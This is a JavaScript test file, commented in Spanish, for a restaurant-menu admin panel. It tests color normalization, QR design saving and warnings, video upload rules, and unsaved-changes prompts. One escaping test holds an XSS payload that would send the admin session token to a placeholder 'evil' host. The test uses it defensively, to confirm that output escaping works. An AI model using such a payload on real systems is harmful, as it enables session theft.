// Funciones que viven en el HTML del panel y en qr.js. No son módulos, así
// que se extraen del fuente y se evalúan: así se prueba el código que se
// despliega y no una copia que puede quedarse atrás.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const PUBLIC = path.join(__dirname, '..', 'public');

// Extrae el trozo de fuente entre dos marcas y lo evalúa en un contexto con
// los stubs que necesite.
//
// 'desde' admite también una lista de pares [desde, hasta] cuando lo que se
// prueba se apoya en un ayudante que vive en otra parte del archivo. Se
// evalúan todos en el MISMO contexto, en el orden dado, porque si no la
// función bajo prueba llamaría a algo que no existe. Se prefiere esto a
// copiar el ayudante al test: una copia se queda atrás sin avisar y entonces
// la prueba pasa contra código que ya no se despliega.
function cargar(archivo, desde, hasta, contexto = {}) {
	const src = fs.readFileSync(path.join(PUBLIC, archivo), 'utf8');
	const pares = Array.isArray(desde) ? desde : [[desde, hasta]];
	const ctx = vm.createContext(Array.isArray(desde) ? (hasta || {}) : contexto);

	for (const [ini, fin] of pares) {
		const i = src.indexOf(ini);
		assert.notEqual(i, -1, `no se encontró "${ini}" en ${archivo} — ¿se renombró?`);
		const f = fin ? src.indexOf(fin, i) : src.length;
		vm.runInContext(src.slice(i, f), ctx);
	}
	return ctx;
}

// ═══════════════════════════════════════════════════════════════
describe('hex6 · normaliza colores para el selector nativo', () => {
	const { hex6 } = cargar('index.html', 'function hex6', '// El cuadrito y el campo');

	test('expande los hex de tres dígitos', () => {
		// <input type="color"> solo admite #rrggbb: un #abc lo dejaría en
		// negro y el cuadrito no coincidiría con lo escrito.
		assert.equal(hex6('#abc'), '#aabbcc');
		assert.equal(hex6('#AABBCC'), '#aabbcc');
	});

	test('acepta las formas razonables de escribir un color', () => {
		assert.equal(hex6('#ffd521'), '#ffd521');
		assert.equal(hex6('ffd521'), '#ffd521', 'sin almohadilla');
		assert.equal(hex6('  #ffd521  '), '#ffd521', 'con espacios');
	});

	test('lo inválido conserva el valor anterior, no salta a negro', () => {
		// Si saltara a negro, el diseño se movería solo mientras alguien
		// termina de teclear el color.
		for (const malo of ['#12345', 'rojo', '', null, undefined, '#zzzzzz'])
			assert.equal(hex6(malo, '#e91e63'), '#e91e63', `con ${JSON.stringify(malo)}`);
	});

	test('los colores que la plataforma usa hoy pasan intactos', () => {
		for (const c of ['#ffd521', '#f5a623', '#cdfefe', '#a374af', '#3d568c',
		                 '#3dd68c', '#12111a', '#1a1825', '#0a0a0f', '#000000', '#ffffff'])
			assert.equal(hex6(c), c);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('esc · escapado en el panel', () => {
	const { esc } = cargar('index.html', 'function esc(s)', 'let token =');

	test('el nombre de un producto no puede inyectar código', () => {
		// Importa más que en el menú público: el superadmin abre el panel de
		// CUALQUIER restaurante y su sesión vive en sessionStorage.
		const payload = '<img src=x onerror="fetch(\'//evil/\'+sessionStorage.menuAdminToken)">';
		const salida = esc(payload);
		assert.ok(!/<[a-zA-Z]/.test(salida), 'no debe quedar ninguna etiqueta');
		assert.ok(!salida.includes('"'), 'no debe quedar comilla que abra un atributo');
	});

	test('un nombre normal se muestra igual', () => {
		assert.equal(esc('HAMBURGUESA'), 'HAMBURGUESA');
		assert.equal(esc("PA' QUE NO JODA"), 'PA&#39; QUE NO JODA');
	});

	test('nulo no imprime la palabra "null"', () => {
		assert.equal(esc(null), '');
		assert.equal(esc(undefined), '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('qrGuardarDiseno · guardar el QR no puede pisar el resto', () => {
	// 'atributos' es un solo JSON compartido por siete pantallas que no se
	// conocen entre sí. El 27/08/2026 se cambiaron las cinco de index.html
	// para que cada una mandara SOLO sus claves y las fundiera el servidor,
	// que sí tiene la versión de ahora. Esta se quedó fuera por vivir en otro
	// archivo, y siguió mandando el objeto entero desde la copia que el panel
	// cargó al entrar.
	//
	// El caso concreto: el superadmin abre el diseñador de QR a las 10:00, el
	// dueño cambia su WhatsApp de pedidos a las 10:05, el superadmin guarda el
	// QR a las 10:10 — y el WhatsApp vuelve al de las 10:00.
	const guardar = async () => {
		const enviado = [];
		const ctx = cargar('qr.js', 'async function qrGuardarDiseno', null, {
			qrCfg: { fg: '#000000', punto: 'redondo' },
			qrLeerControles: () => {},
			document: { getElementById: () => ({ textContent: '', style: {} }) },
			showToast: () => {},
			state: {
				restaurante: {
					id: 'r1',
					// Lo que el panel cargó al entrar y ya está viejo.
					atributos: { whatsapp_pedidos: '573001112233', nav: 'carrito', qr: { fg: '#ffffff' } },
				},
			},
			apiFetch: async (metodo, ruta, cuerpo) => { enviado.push({ metodo, ruta, cuerpo }); return { id: 'r1' }; },
		});
		await ctx.qrGuardarDiseno();
		return enviado[0];
	};

	test('manda SOLO la clave qr', async () => {
		const { cuerpo } = await guardar();
		assert.deepEqual(Object.keys(cuerpo.atributos), ['qr'],
			'cualquier otra clave arrastra un valor viejo encima del de ahora');
	});

	test('no reenvía el WhatsApp de pedidos que cargó al entrar', async () => {
		// La clave concreta que más duele: es a dónde llega el dinero.
		const { cuerpo } = await guardar();
		assert.equal(cuerpo.atributos.whatsapp_pedidos, undefined);
		assert.equal(cuerpo.atributos.nav, undefined);
	});

	test('el diseño sí viaja entero', async () => {
		const { cuerpo, metodo } = await guardar();
		assert.equal(metodo, 'PATCH');
		assert.equal(cuerpo.atributos.qr.punto, 'redondo', 'lo que se acaba de elegir');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Diseñador de QR · avisos de escaneabilidad', () => {
	// qrRevisarAvisos y qrLeerControles leen del DOM; se les da uno falso.
	function preparar(cfgPrevia, entradas) {
		const campos = {
			qrColorFg:   { value: entradas.fg ?? '#000000' },
			qrColorOjos: { value: entradas.ojos ?? '' },
			qrColorBg:   { value: entradas.bg ?? '#ffffff' },
			qrCartelBg:  { value: '#111111' },
			qrCartelFg:  { value: '#ffffff' },
			qrTransparente: { checked: false },
			qrUsarLogo:  { checked: false },
			qrLogoTam:   { value: '22' },
			qrMargen:    { value: String(entradas.margen ?? 4) },
			qrCartelTitulo: { value: '' },
			qrCartelPie: { value: '' },
			qrAviso:     { textContent: '', style: {} },
		};
		const ctx = cargar('qr.js', 'const QR_HEX_RE', 'function qrElegirEstilo', {
			qrCfg: { ...cfgPrevia },
			document: { getElementById: id => campos[id] || null },
		});
		ctx.qrLeerControles();
		ctx.qrRevisarAvisos();
		return { aviso: campos.qrAviso.textContent, cfg: ctx.qrCfg };
	}

	test('un color mal escrito avisa y conserva el anterior', () => {
		// Canvas ignora en silencio un fillStyle inválido y se queda con el
		// del fondo: el QR salía en blanco sin que nada lo dijera.
		const { aviso, cfg } = preparar({ fg: '#e91e63', bg: '#ffffff' }, { fg: '#12345' });
		assert.match(aviso, /Color no válido/);
		assert.equal(cfg.fg, '#e91e63', 'no se pierde el color que ya funcionaba');
	});

	test('nombra los campos concretos que están mal', () => {
		const { aviso } = preparar({ fg: '#000000', bg: '#ffffff' }, { fg: 'rojo', bg: 'blanco' });
		assert.match(aviso, /los puntos y el fondo/);
	});

	test('los formatos válidos no se marcan como inválidos', () => {
		// Ojo: #abc es #aabbcc, un azul claro que sobre blanco sí dispara el
		// aviso de contraste. Eso es correcto; aquí solo interesa que no se
		// le acuse de estar mal escrito.
		for (const [entradas, etiqueta] of [
			[{ fg: '#abc' }, 'hex de 3 dígitos'],
			[{ fg: '#AABBCC' }, 'mayúsculas'],
			[{ ojos: '' }, 'esquinas vacío = igual que los puntos'],
			[{ fg: '#000000' }, 'hex completo'],
		]) assert.doesNotMatch(preparar({}, entradas).aviso, /Color no válido/, etiqueta);
	});

	test('un margen por debajo de la norma avisa', () => {
		// La norma del QR pide 4 módulos de zona de silencio; con menos,
		// muchos lectores fallan impreso junto a otros elementos.
		assert.match(preparar({}, { margen: 0 }).aviso, /Margen de 0 módulos/);
		assert.match(preparar({}, { margen: 1 }).aviso, /Margen de 1 módulo\b/, 'singular');
		assert.doesNotMatch(preparar({}, { margen: 4 }).aviso, /Margen/);
		assert.doesNotMatch(preparar({}, { margen: 8 }).aviso, /Margen/);
	});

	test('el aviso de contraste sigue funcionando', () => {
		assert.match(preparar({}, { fg: '#ffffff', bg: '#000000' }).aviso, /claro sobre fondo oscuro/);
		assert.match(preparar({}, { fg: '#777777', bg: '#888888' }).aviso, /poco contraste/);
		assert.equal(preparar({}, { fg: '#000000', bg: '#ffffff', margen: 4 }).aviso, '', 'negro sobre blanco, sin avisos');
	});

	test('varios problemas se listan juntos, no se pisan', () => {
		const { aviso } = preparar({ fg: '#000000' }, { fg: '###', margen: 0 });
		assert.ok(aviso.split('\n').length >= 2, 'debe verlos todos de una vez');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('pintarVideoPlato · la subida de video depende del plan', () => {
	// Esconder el grupo no es la seguridad —esa vive en POST /api/video—,
	// pero sí es lo que evita ofrecerle a un restaurante algo que no ha
	// contratado y que la API le va a rechazar.
	const pantalla = () => {
		const ids = ['videoGroup', 'videoEditPreview', 'videoEditVacio',
			'btnSubirVideo', 'videoUploadStatus', 'videoFileInput',
			'videoDesdeFila', 'btnConfirmarVideo', 'videoDesde', 'videoDesdeAviso',
				'videoFallido', 'videoFallidoMotivo',
				// El bloque de revisión de lo que generó el modelo.
				'iaRevision', 'iaRevisionVideo', 'iaRevisionEstado',
				'btnPublicarIA', 'btnDescartarIA',
				// El aviso de "este video quedó en el formato anterior".
				'videoDesfasado', 'videoDesfasadoTexto', 'videoDesfasadoEstado', 'btnReconvertir'];
		const mapa = {};
		for (const id of ids) mapa[id] = {
			style: {}, textContent: '', value: '', disabled: false,
			removeAttribute(n) { delete this[n === 'poster' ? 'poster' : 'src']; },
			load() {},
		};
		return mapa;
	};

	const pintar = (videos, plato, mapa, trabajos = [], porAprobar = [], nav = 'video') => {
		// Dos trozos, en este orden: videoDesfasadoDe() pregunta por
		// formatoDeLaCarta(), que vive arriba con el resto de lo que sabe de
		// modelos. Se carga el ayudante de verdad en vez de un doble para que
		// esta prueba siga midiendo la regla que se despliega.
		const ctx = cargar('index.html', [
			['function formatoDeLaCarta', 'function idPlanActual'],
			['// Los trabajos de conversión del restaurante.', '// Elegir el archivo ya no lo sube'],
		], {
				clearInterval() {},
				planActual: () => ({ videos }),
				state: { trabajosVideo: trabajos, videosPorAprobar: porAprobar,
				         restaurante: { atributos: { nav } } },
				document: { getElementById: id => mapa[id] },
			});
		ctx.pintarVideoPlato(plato);
		return mapa;
	};

	test('un plan sin video no enseña la subida', () => {
		const m = pintar(false, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'none');
	});

	test('el plan de video sí la enseña', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'block');
	});

	test('un plato sin guardar no puede recibir video todavía', () => {
		// El video se cuelga de un producto_id que aún no existe. Dejar el
		// botón vivo mandaría la subida a un 400 sin explicar por qué.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnSubirVideo.disabled, true);
		assert.match(m.videoEditVacio.textContent, /Guarda el plato primero/);
	});

	test('un plato con video ya convertido lo muestra', () => {
		const url = 'https://ejemplo.test/uploads/videos/a.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla());
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.videoEditPreview.style.display, 'block');
		assert.equal(m.videoEditVacio.style.display, 'none');
	});

	// ── EL VIDEO QUE QUEDÓ EN EL FORMATO ANTERIOR ─────────────
	// Cambiar el modelo de la carta no re-recorta los videos ya convertidos: se
	// quedan como estaban y el restaurante ve una franja del centro creyendo
	// que la conversión salió mal. El master permite arreglarlo sin volver a
	// grabar, pero solo si el panel dice que se puede.
	const conVideo = { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/uploads/videos/a.mp4' } } };
	const listo = (formato, tiene_master = true) => [{
		id: 't1', producto_id: 'p1', estado: 'listo', formato, tiene_master,
		creado_en: '2026-08-26T10:00:00Z',
	}];

	test('un video en el formato de la carta no avisa de nada', () => {
		const m = pintar(true, conVideo, pantalla(), listo('vertical'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	test('un video apaisado en una carta vertical ofrece reconvertir', () => {
		const m = pintar(true, conVideo, pantalla(), listo('horizontal'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'block');
		assert.match(m.videoDesfasadoTexto.textContent, /vertical/);
		assert.equal(m.btnReconvertir.disabled, false);
	});

	test('sin master no se ofrece: no hay de dónde volver a cortar', () => {
		// Ofrecer un botón que va a fallar no le dice a nadie por qué.
		const m = pintar(true, conVideo, pantalla(), listo('horizontal', false), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	test('sin video publicado tampoco hay nada desfasado', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	// ── LO QUE GENERÓ EL MODELO ───────────────────────────────
	// Un video generado se convierte igual que cualquier otro, pero el plato
	// no lo enseña hasta que alguien lo mira. Estas tres comprueban que el
	// panel refleja esa diferencia, porque para la cola los dos son 'listo'.
	const generado = {
		id: 'trab-ia', producto_id: 'p1', creado_en: '2026-08-26T10:00:00Z',
		video: 'https://ejemplo.test/uploads/videos/ia.mp4',
		portada: 'https://ejemplo.test/uploads/miniaturas/ia.jpg',
	};

	test('un video generado esperando revisión se enseña con su bloque', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), [], [generado]);
		assert.equal(m.iaRevision.style.display, 'block');
		assert.equal(m.iaRevisionVideo.src, generado.video);
		assert.equal(m.iaRevisionVideo.poster, generado.portada);
	});

	test('el bloque de revisión convive con el video ya publicado', () => {
		// Un plato puede tener video en la carta Y una animación nueva
		// esperando. Los dos tienen que verse: sin comparar no hay decisión.
		const url = 'https://ejemplo.test/uploads/videos/viejo.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla(), [], [generado]);
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.iaRevision.style.display, 'block');
	});

	test('el video en revisión no se arrastra al siguiente plato', () => {
		// Mismo fallo que con la previsualización de arriba, y aquí es peor:
		// se aprobaría para un plato el video generado de otro.
		const m = pantalla();
		pintar(true, { id: 'p1' }, m, [], [generado]);
		pintar(true, { id: 'p2' }, m, [], [generado]);
		assert.equal(m.iaRevision.style.display, 'none');
		assert.equal(m.iaRevisionVideo.src, undefined);
	});

	test('un plato sin video no arrastra el del anterior', () => {
		// El elemento <video> es el mismo para todos los platos: si no se le
		// quita el src, abrir un plato sin video enseña el del que se miró antes.
		const m = pantalla();
		pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/a.mp4' } } }, m);
		pintar(true, { id: 'p2' }, m);
		assert.equal(m.videoEditPreview.src, undefined, 'debe soltar el src del plato anterior');
		assert.equal(m.videoEditPreview.style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · el trozo elegido tiene que caber', () => {
	// Se guardan 8 segundos desde el punto que marque el restaurante. Si
	// elige uno donde ya no quedan 8, el video sale más corto — y eso se
	// sabe antes de subir nada, no después de esperar minuto y medio a que
	// ffmpeg termine.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: 'sucio', style: {} },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('con hueco de sobra no dice nada', () => {
		assert.equal(conVideo(30, 5).aviso, '', 'quedan 25 s, no hay nada que avisar');
	});

	test('justo en el límite tampoco', () => {
		assert.equal(conVideo(30, 22).aviso, '', 'quedan exactamente 8 s');
	});

	test('avisa cuando el trozo se queda corto', () => {
		assert.match(conVideo(30, 26).aviso, /4\.0 s/, 'quedan 4 s y hay que decirlo');
	});

	test('no muestra segundos negativos si se pasa del final', () => {
		// Escribir 40 en un video de 30 daba "-10.0 s", que no significa nada.
		assert.match(conVideo(30, 40).aviso, /0\.0 s/);
	});

	test('sin metadatos todavía no aventura nada', () => {
		// La duración no se conoce hasta loadedmetadata; hasta entonces es NaN
		// y un aviso calculado con eso sería basura.
		assert.equal(conVideo(NaN, 5).aviso, '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · lo demasiado corto no se sube', () => {
	// Idea del propio usuario, y es mejor que convertirlo igual: un bucle de
	// un segundo en una carta marea. Más vale decirlo antes de que suban
	// treinta megas para nada.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: '', style: {} },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('un video de un segundo no deja subir', () => {
		const r = conVideo(1, 0);
		assert.equal(r.bloqueado, true);
		assert.match(r.aviso, /al menos 3/);
	});

	test('justo en el mínimo sí deja', () => {
		assert.equal(conVideo(3, 0).bloqueado, false, '3 s exactos son válidos');
	});

	test('un video largo con el punto casi al final tampoco deja', () => {
		// Lo que importa no es cuánto dura el original sino cuánto queda desde
		// donde empieza el recorte.
		assert.equal(conVideo(40, 38).bloqueado, true, 'quedan 2 s de 40');
		assert.equal(conVideo(40, 30).bloqueado, false, 'quedan 10 s');
	});

	test('volver a un punto válido vuelve a permitir', () => {
		// El botón se deshabilita, y si no se rehabilitara al corregir el
		// número el usuario se quedaría encerrado sin saber por qué.
		assert.equal(conVideo(20, 19).bloqueado, true);
		assert.equal(conVideo(20, 5).bloqueado, false);
	});

	test('sin metadatos no se bloquea nada', () => {
		// La duración llega con loadedmetadata. Bloquear antes dejaría el botón
		// muerto en los milisegundos previos y parecería roto.
		assert.equal(conVideo(NaN, 0).bloqueado, false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cambios sin guardar · la ficha no se cierra en silencio', () => {
	// Un clic fuera del modal lo cerraba y se llevaba lo escrito. Se compara
	// una firma del formulario en vez de levantar una bandera al primer
	// tecleo: escribir algo y borrarlo no debe contar como cambio, porque
	// preguntar cuando no hay nada que perder enseña a decir que sí sin leer.
	const montar = ({ videoElegido = null } = {}) => {
		const mapa = {
			editNombre:       { value: 'Croquetas' },
			editCategoria:    { value: 'cat-1' },
			editPrecioNum:    { value: '24000' },
			editDesc:         { value: '' },
			editDescAvanzada: { value: '' },
			editDisponible:   { checked: true },
		};
		const abiertos = [], cerrados = [];
		const ctx = cargar('index.html', 'function firmaProducto', 'async function saveProduct', {
			state: { pendingImgUrl: null, extraImgs: [], prodFiltros: [], prodBadges: {} },
			videoElegido,
			document: { getElementById: id => mapa[id] },
			openModal:  id => abiertos.push(id),
			closeModal: id => cerrados.push(id),
		});
		return { ctx, mapa, abiertos, cerrados };
	};

	test('sin tocar nada, no hay cambios', () => {
		const { ctx } = montar();
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false);
	});

	test('cambiar un campo cuenta como cambio', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Croquetas de jamón';
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('escribir y deshacer NO cuenta como cambio', () => {
		// Lo que evita el aviso inútil que la gente aprende a ignorar.
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editPrecioNum.value = '99000';
		assert.equal(ctx.productoTieneCambios(), true, 'mientras está cambiado, sí');
		mapa.editPrecioNum.value = '24000';
		assert.equal(ctx.productoTieneCambios(), false, 'al volver al valor original, no');
	});

	test('el interruptor de disponible también cuenta', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editDisponible.checked = false;
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('un video elegido y sin subir es trabajo por perder', () => {
		// Hay que volver a buscar el archivo y a marcar el segundo de inicio.
		const { ctx } = montar({ videoElegido: { name: 'plato.mp4' } });
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false, 'si ya estaba al abrir, no es un cambio');

		const otra = montar();
		otra.ctx.fijarFirmaProducto();
		// Simular que se elige un archivo después de abrir la ficha.
		otra.ctx.videoElegido = { name: 'plato.mp4' };
		assert.equal(otra.ctx.productoTieneCambios(), true);
	});

	test('sin cambios, cerrar cierra directo', () => {
		const { ctx, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();
		assert.deepEqual(cerrados, ['productModal']);
		assert.deepEqual(abiertos, [], 'no hay por qué preguntar nada');
	});

	test('con cambios, cerrar pregunta antes', () => {
		const { ctx, mapa, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.intentarCerrarProducto();
		assert.deepEqual(abiertos, ['cambiosModal']);
		assert.deepEqual(cerrados, [], 'la ficha sigue abierta hasta que decida');
	});

	test('salir sin guardar cierra las dos ventanas', () => {
		const { ctx, mapa, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.salirSinGuardar();
		assert.deepEqual(cerrados, ['cambiosModal', 'productModal']);
	});

	test('sin firma fijada no molesta', () => {
		// Estado de arranque, antes de abrir ninguna ficha: no hay nada que
		// comparar y no se puede inventar un cambio.
		const { ctx } = montar();
		assert.equal(ctx.productoTieneCambios(), false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarFichaAlModelo · cada modelo enseña lo suyo', () => {
	// La misma ficha sirve para todos los modelos. Un control que no hace
	// nada es peor que no tenerlo: quien lo usa cree que está trabajando.
	const conModelo = nav => {
		const mapa = {
			extraImgsGroup:   { style: {} },
			labelImagen:      { innerHTML: '' },
			labelVideo:       { innerHTML: '' },
			videoEditPreview: { style: {} },
		};
		// Dos trozos: la lista de modelos que pintan video y la función que
		// la consulta. Se cargan los dos del fuente en vez de escribir la
		// lista aquí, para que añadir un encuadre nuevo al panel y olvidarse
		// de esta prueba no dé un falso verde.
		const ctx = cargar('index.html', [
			['// ── MODELOS QUE PINTAN VIDEO', 'function idPlanActual'],
			['function ajustarFichaAlModelo', '// ── CAMBIOS SIN GUARDAR'],
		], {
			state: { restaurante: { atributos: { nav } } },
			document: { getElementById: id => mapa[id] },
		});
		ctx.ajustarFichaAlModelo();
		return mapa;
	};

	test('los modelos de video esconden las imágenes adicionales', () => {
		// Ni temas/video.js ni temas/vertical.js leen atributos.imagenes en
		// ninguna parte: subirlas ahí es subirlas para nadie.
		for (const nav of ['video', 'vertical'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, 'none', `en ${nav}`);
	});

	test('los demás modelos las siguen enseñando', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, '', `en ${nav}`);
	});

	test('en los modelos de video, la foto se explica como respaldo', () => {
		// Deja de ser lo que se ve y pasa a ser lo que se ve mientras no haya
		// video. Eso hay que decirlo donde se mira, no en un manual.
		for (const nav of ['video', 'vertical'])
			assert.match(conModelo(nav).labelImagen.innerHTML, /mientras el plato no tenga video/, `en ${nav}`);
	});

	test('en los demás la etiqueta se queda limpia', () => {
		assert.equal(conModelo('topnav').labelImagen.innerHTML, 'Imagen');
	});

	test('un restaurante sin modelo declarado no se rompe', () => {
		// atributos.nav vacío es 'topnav' por defecto en el menú público.
		const mapa = conModelo(undefined);
		assert.equal(mapa.extraImgsGroup.style.display, '');
		assert.equal(mapa.labelImagen.innerHTML, 'Imagen');
	});

	test('la proporción prometida es la que el worker va a cortar', () => {
		// El servidor deriva el formato del modelo: 'vertical' pide 720x1280 y
		// todo lo demás 1280x720. Si la ficha dijera 16:9 a un restaurante
		// vertical, estaría prometiendo un recorte que no se va a hacer.
		assert.match(conModelo('vertical').labelVideo.innerHTML, /9:16/);
		for (const nav of ['video', 'topnav', 'carrito', undefined])
			assert.match(conModelo(nav).labelVideo.innerHTML, /16:9/, `en ${nav}`);
	});

	test('la previsualización tiene el hueco del formato que se guarda', () => {
		// Con el hueco apaisado clavado, un 9:16 entra recortado por object-fit
		// y enseña una franja del centro: parece que la conversión salió mal
		// cuando salió bien.
		assert.equal(conModelo('vertical').videoEditPreview.style.aspectRatio, '9 / 16');
		assert.equal(conModelo('video').videoEditPreview.style.aspectRatio, '16 / 9');
		assert.equal(conModelo('topnav').videoEditPreview.style.aspectRatio, '16 / 9');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('mensajeDeSubida · qué se lee cuando falla un video', () => {
	// Un video son decenas de megas por una conexión doméstica. El panel
	// enseñaba "Error" a secas para todas las formas de fallar ahí, y con eso
	// no se puede diagnosticar nada: pasó de verdad con el Tartar de Indigo y
	// hubo que reconstruirlo desde los registros de Supabase.
	const { mensajeDeSubida } = cargar('index.html',
		'function mensajeDeSubida', 'function enviarVideo', {});

	test('cortarse a medias dice por dónde iba', () => {
		// El porcentaje es lo que separa "es tu conexión" de "es el servidor".
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 8.4 }),  /8%/);
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 61.7 }), /62%/);
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 61.7 }), /no llegó entero/);
	});

	test('subido entero y sin respuesta NO invita a reintentar', () => {
		// Aquí el trabajo puede estar ya encolado. Decir "vuelve a intentarlo"
		// es pedir el mismo video dos veces y dejar uno huérfano en el disco.
		const m = mensajeDeSubida({ tipo: 'red', porcentaje: 100 });
		assert.match(m, /se subió entero/);
		assert.ok(!/vuelve a intentarlo/i.test(m), 'no debe empujar a reintentar');
	});

	test('lo que explique el servidor manda sobre cualquier texto nuestro', () => {
		// "El archivo pasa del límite de 200 MB" y "Solo MP4 o MOV" están
		// escritos para leerse; taparlos con un genérico sería peor.
		assert.equal(
			mensajeDeSubida({ tipo: 'http', estado: 400, error: 'Solo MP4 o MOV' }),
			'Solo MP4 o MOV');
		assert.equal(
			mensajeDeSubida({ tipo: 'http', estado: 507, error: 'No hay espacio suficiente en el servidor' }),
			'No hay espacio suficiente en el servidor');
	});

	test('un estado sin cuerpo legible no se queda en "Error"', () => {
		// Es exactamente el caso que no supimos leer: algo por delante del
		// servidor contesta su propia página HTML y el panel no la entiende.
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 413 }), /413/);
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 413 }), /tamaño/);
		for (const estado of [502, 503, 504])
			assert.match(mensajeDeSubida({ tipo: 'http', estado }), new RegExp(String(estado)));
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 418 }), /418/);
	});

	test('ningún camino devuelve vacío ni la palabra "Error" a secas', () => {
		const casos = [
			{ tipo: 'red', porcentaje: 0 }, { tipo: 'red', porcentaje: 100 },
			{ tipo: 'http', estado: 400 }, { tipo: 'http', estado: 413 },
			{ tipo: 'http', estado: 500 }, { tipo: 'http', estado: 504 },
			{ tipo: 'http', estado: 0 },
		];
		for (const c of casos) {
			const m = mensajeDeSubida(c);
			assert.ok(m && m.length > 20, `mensaje pobre en ${JSON.stringify(c)}: ${m}`);
			assert.notEqual(m, 'Error');
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('trabajoEnCursoDe · una conversión en marcha se ve al reabrir', () => {
	// La vigilancia sobrevive a cerrar la ficha, pero no a recargar la página.
	// Sin esto, el plato vuelve a decir "Sin video" mientras el worker todavía
	// lo tiene, y lo natural es subirlo otra vez: dos videos buenos para el
	// mismo plato y un original huérfano ocupando disco.
	const conTrabajos = trabajos => {
		const ctx = cargar('index.html', 'function trabajoFallidoDe', 'async function descartarVideoFallido',
			{ state: { trabajosVideo: trabajos } });
		return ctx;
	};

	const t = (id, producto_id, estado, creado_en) => ({ id, producto_id, estado, creado_en });

	test('encuentra el que espera turno y el que ya está en ffmpeg', () => {
		// Para quien mira la ficha son lo mismo: su video no está todavía.
		for (const estado of ['pendiente', 'procesando']) {
			const ctx = conTrabajos([t('t1', 'p1', estado, '2026-08-20T10:00:00Z')]);
			assert.equal(ctx.trabajoEnCursoDe('p1')?.id, 't1', `con estado ${estado}`);
		}
	});

	test('lo terminado no cuenta como en marcha', () => {
		// Si 'listo' contara, el botón de subir se quedaría apagado para
		// siempre en cuanto el plato tuviera un video.
		for (const estado of ['listo', 'error']) {
			const ctx = conTrabajos([t('t1', 'p1', estado, '2026-08-20T10:00:00Z')]);
			assert.equal(ctx.trabajoEnCursoDe('p1'), null, `con estado ${estado}`);
		}
	});

	test('no se cruzan los platos', () => {
		const ctx = conTrabajos([t('t1', 'otro', 'procesando', '2026-08-20T10:00:00Z')]);
		assert.equal(ctx.trabajoEnCursoDe('p1'), null);
	});

	test('con varios, el más reciente', () => {
		const ctx = conTrabajos([
			t('viejo', 'p1', 'pendiente',  '2026-08-20T10:00:00Z'),
			t('nuevo', 'p1', 'procesando', '2026-08-20T11:00:00Z'),
		]);
		assert.equal(ctx.trabajoEnCursoDe('p1').id, 'nuevo');
	});

	test('sin trabajos cargados no revienta', () => {
		// planActual().videos falso deja state.trabajosVideo en [], y un fallo
		// de red lo deja igual: la ficha tiene que abrirse de todas formas.
		for (const v of [[], undefined, null])
